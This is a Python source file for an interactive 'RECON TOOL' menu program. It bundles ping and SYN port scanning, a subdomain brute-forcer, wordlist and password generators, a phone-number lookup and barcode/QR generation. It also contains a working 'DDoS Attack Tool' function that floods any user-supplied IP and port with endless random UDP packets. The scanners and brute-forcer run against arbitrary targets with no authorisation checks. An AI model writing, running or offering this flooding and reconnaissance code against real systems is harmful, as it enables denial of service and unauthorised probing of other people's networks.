from scapy.all import *
import treepoem  
from passwordgenerator import pwgenerator  
import string
import random
import phonenumbers  
from phonenumbers import geocoder  
from phonenumbers import carrier  
from phonenumbers import timezone  
import re
import requests
import socket
import nmap
import pyfiglet  


def ip_scanner(ip):
    response = sr1(IP(dst=ip) / ICMP(), timeout=1, verbose=False)  
    print("\n[+] Target   : " + ip)
    if response:
        return True
    else:
        return False


def port_scanner(ip, port):
    nmscan = nmap.PortScanner()
    nmscan.scan(ip, str(port))
    response = sr1(
        IP(dst=ip) / TCP(dport=int(port), flags="S"), timeout=1, verbose=False
    )  
    if response and response.haslayer(TCP):  
        if response[TCP].flags == "SA":  
            if nmscan[ip]["tcp"][int(port)]["name"]:
                print(
                    "{}/tcp\tOpen\t{}".format(
                        port, nmscan[ip]["tcp"][int(port)]["name"]
                    )
                )
            else:
                print("{}/tcp\tOpen\tUnknown".format(port))
        if response[TCP].flags == "RA":  
            if nmscan[ip]["tcp"][int(port)]["name"]:
                print(
                    "\r{}/tcp\tClosed\t{}".format(
                        port, nmscan[ip]["tcp"][int(port)]["name"]
                    )
                )
    else:
        print("[-] TCP layer not found in the answered packet")


def barcode_and_qrcode_generator(codec, value):
    image = treepoem.generate_barcode(barcode_type=codec, data=value)
    if codec == "code128":
        image.save("barcode.png")
        print("[+] File saved : barcode.png")
    else:
        image.save("qrcode.png")
        print("[+] File saved : qrcode.png")


def password_generator():
    password = pwgenerator.generate()
    print(password)


def generate_wordlist(pattern=None, wordlist_length=100):
    if pattern is None:
        word_length = random.randint(4, 12)
        lowercase = string.ascii_lowercase
        uppercase = string.ascii_uppercase
        numbers = string.digits
        special_chars = string.punctuation

        wordlist = set()

        while len(wordlist) < int(wordlist_length):
            word = ""
            word += random.choice(lowercase)
            word += random.choice(uppercase)
            word += random.choice(numbers)
            word += random.choice(special_chars)
            for _ in range(word_length - 4):
                word += random.choice(lowercase + uppercase + numbers + special_chars)
            word_list = list(word)
            random.shuffle(word_list)
            word = "".join(word_list)
            wordlist.add(word)
    else:
        char_sets = {
            "l": string.ascii_lowercase,
            "u": string.ascii_uppercase,
            "n": string.digits,
            "s": string.punctuation,
        }

        wordlist = set()

        while len(wordlist) < int(wordlist_length):
            word = ""
            for char in pattern:
                if char in char_sets:
                    word += random.choice(char_sets[char])
                else:
                    word += char
            wordlist.add(word)

    with open("wordlist.txt", "w") as f:
        for word in wordlist:
            f.write(f"{word}\n")


def phone_number_info(number):
    phone_number = phonenumbers.parse(number)
    country = geocoder.description_for_number(phone_number, "en")
    carrier_service = carrier.name_for_number(phone_number, "en")
    location = timezone.time_zones_for_number(phone_number)
    print("[+] PHONE NUMBER : ", number)
    print("[+] COUNTRY      : ", country)
    print("[+] CARRIER NAME : ", carrier_service)
    print("[+] LOCATION     : ", location)


def subdomain_checker(wordlist_location, url):
    with open(wordlist_location, "r") as word_list:
        for word in word_list:
            line = word.strip()
            site = line + "." + url
            try:
                response = requests.get("https://" + site)
                if response:
                    print("\n[+] Subdomain Found >> " + str(site))
            except requests.exceptions.ConnectionError:
                continue
            except Exception:
                continue
            except KeyboardInterrupt:
                continue


def ddos_attack(ip, port=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1500)
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        print("[+] Sent %s packet To %s through port : %s" % (sent, ip, port))
        time.sleep(0.1)


if __name__ == "__main__":
    try:
        result = pyfiglet.figlet_format("RECON TOOL", font="5lineoblique")
        print(result)
        print(
            "\n1. IP Scanner \n2. Port Scanner\n3. Barcode Generator\n4. QRCode Generator\n5. Password Generator\n6. Wordlist Generator\n7. Phone number Information Gathering\n8. Subdomain Checker\n9. DDoS Attack Tool\n10. Exit"
        )
        while True:
            try:
                option = int(input("\nOption >> "))
            except Exception:
                continue
            try:
                match option:
                    case 1:
                        print("\n\t\t\t--------IP SCANNER--------")
                        ip = input("\n[+] IP >> ")
                        result = ip_scanner(ip)
                        if result:
                            print("[+] Status   :  up")
                            print("[+] Protocol :  TCP")
                            continue
                        else:
                            print("[+] Status : down")
                            continue
                    case 2:
                        print("\n\t\t\t--------PORT SCANNER--------")
                        ip = input("\n>>IP : ")
                        port_list = []
                        ports = str(input(">>Port Number : "))
                        if "-" in ports:
                            start_port, end_port = map(int, ports.split("-"))
                            for p in range(start_port, end_port + 1):
                                port_list.append(p)
                        elif "," in ports:
                            port_list = ports.split(",")
                        else:
                            port_list.append(ports)
                        result = ip_scanner(ip)
                        if result:
                            print("[+] Status   :  up")
                            print("[+] Protocol :  TCP")
                            print(
                                "\n------------------------\nPort\tStatus\tService\n------------------------"
                            )
                            for port in port_list:
                                port_scanner(ip, str(port))
                            continue

                    case 3:
                        print("\n\t\t\t--------BARCODE GENERATOR--------")
                        bar_data = input("[+] Enter Data To Convert to Barcode >> ")
                        barcode_and_qrcode_generator("code128", bar_data)
                        continue

                    case 4:
                        print("\n\t\t\t--------QRCODE GENERATOR--------")
                        qr_data = input("[+] Enter Data To Convert to QRCode >> ")
                        barcode_and_qrcode_generator("qrcode", qr_data)

                    case 5:
                        number = int(
                            input("\n[+] Enter number of Password to generate >> ")
                        )
                        print(f"\n[+] Generating {number} random password....\n")
                        for num in range(1, number + 1):
                            password_generator()

                    case 6:
                        print("\n\t\t------------WORDLIST GENERATOR------------")
                        print(
                            "Pattern Usage :\n\t\tUppercase -> u , Lowercase -> l , Numbers -> n , Special Characters -> s\n[-] You can leave the input empty...."
                        )
                        pattern = input("\nEnter Pattern >> ")
                        count = input("Enter number of words to generate >> ")
                        wordlist_pattern = generate_wordlist(pattern, int(count))
                        print("\n------Saved to Wordlist.txt------\n")

                    case 7:
                        try:
                            print("\n\t\t\t--------PHONE NUMBER INFORMATION--------")
                            number = str(
                                input("\n[+] Phone number with country code >> ")
                            )
                            phone_number_info(str(number))
                        except (
                            Exception,
                            phonenumbers.phonenumberutil.NumberParseException,
                        ) as e:
                            print("[-] Error : ", e)
                            continue

                    case 8:
                        try:
                            print("\n\t\t\t--------SUBDOMAIN CHECKER--------")
                            url = input("Enter target url >> ")
                            wordlist_location = str(input("Wordlist Directory >> "))
                            subdomain_checker(wordlist_location, url)
                        except FileNotFoundError as e:
                            print("[-] Error : ", e)
                            continue

                    case 9:
                        try:
                            print("\n\t\t\t--------DDoS Attack Tool--------\n")
                            ip = input("[+] Target IP  >> ")
                            if ip == "":
                                print("\n[-] Please provide an IP Address....")
                                continue
                            print("\n[+] Use Port Scanner to find open ports....\n")
                            port = input("[+] Port       >> ")
                            if port == "":
                                print("\n[-] Please specify a PORT Number....")
                                continue
                            ddos_attack(ip, int(port))
                        except KeyboardInterrupt:
                            continue

                    case 10:
                        print("\nExiting....")
                        exit()
            except AttributeError:
                print("[-] Attribute error...")
                continue

    except Exception as e:
        print("[-] Error : ", e)
        pass
